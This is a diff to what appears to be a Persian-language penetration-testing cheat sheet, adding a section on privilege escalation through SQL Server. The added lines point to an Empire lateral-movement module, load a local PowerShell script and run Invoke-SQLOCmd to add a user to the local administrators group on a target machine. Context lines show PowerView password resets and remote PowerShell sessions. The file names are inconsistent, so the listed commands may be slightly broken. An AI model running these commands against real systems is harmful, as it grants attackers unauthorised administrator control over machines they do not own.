@@ -514,6 +514,14 @@ Set-DomainUserPassword -Identity user1 -verbose
 Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
 ```
 
+### ارتقا دسترسی با استفاده از سرویس Sql و ActiveSessions
+
+```text
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1
+. .\Heidi.ps1
+Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” -Instance COMPUTERNAME
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
